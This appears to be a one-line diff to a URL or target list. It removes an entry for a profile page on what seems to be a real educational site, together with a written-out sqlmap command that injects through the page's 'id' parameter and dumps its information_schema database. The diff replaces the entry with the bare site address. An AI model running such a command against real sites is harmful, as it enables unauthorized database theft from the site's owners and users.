@@ -1,1 +1,1 @@
-https://www.ccl.edu.pk/profile.php?id=17 (GET)  # /usr/bin/sqlmap -u https://www.ccl.edu.pk/profile.php?id=17 -D information_schema --dump --batch --output-dir=/path/to/save/folder
+https://www.ccl.edu.pk/
